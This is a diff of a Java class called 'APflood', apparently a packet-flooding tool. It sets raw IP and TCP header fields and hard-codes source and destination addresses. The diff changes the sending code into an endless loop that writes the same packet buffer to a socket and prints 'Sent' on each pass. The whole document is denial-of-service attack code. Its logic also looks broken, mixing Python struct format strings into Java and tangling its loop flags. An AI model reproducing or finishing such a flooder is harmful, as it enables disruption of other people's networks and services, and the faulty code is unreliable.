@@ -16,8 +16,11 @@ class APflood {
   public static void main(String[] args) {
 
     boolean et = true;
+    int count = 1000;
     String characters = "!BBHHHBBH4s4s";
     String newCharacters = "HHLLBBHHH";
+    String source_ip = "10.1.10.1";
+    String dest_ip = "10.1.12.173";
     byte[] charactersBytes = characters.getBytes();
     int ip_ihl = 5;
     int ip_tos = 0;
@@ -38,9 +41,7 @@ class APflood {
 	int tcp_ack_seq = 0;
 	int tcp_window = 5840;
 	int tcp_check = 0;
-	int tcp_urg_ptr = 0;
-    String source_ip = "10.1.10.1";
-    String dest_ip = "10.1.12.173";
+	int tcp_urg_ptr = 0; 
     int ip_ver = 4;
     int placeholder = 0;
     Socket socket = null;
@@ -119,22 +120,29 @@ class APflood {
 
 	
 
-	while (et = true) { 
+	while (true) { 
+		
 		try (DataOutputStream outToServer = new DataOutputStream(socket.getOutputStream()))
 		{ 
+			while (et != false) {
 			outToServer.write(arr, 0, size);
+			System.out.println("Sent");
+		}
+			
 			} catch (IOException ee) { 
 				System.out.println("error sending");
 			} 
-			et = false;
+			
 			break;
 			} try { 
 				socket.close(); 
 			} catch (IOException ee) { 
+				et = false;
 				System.out.println("Sorry, error closing socket. Try again");
 			}
 		}
 	}
+
 
 
 
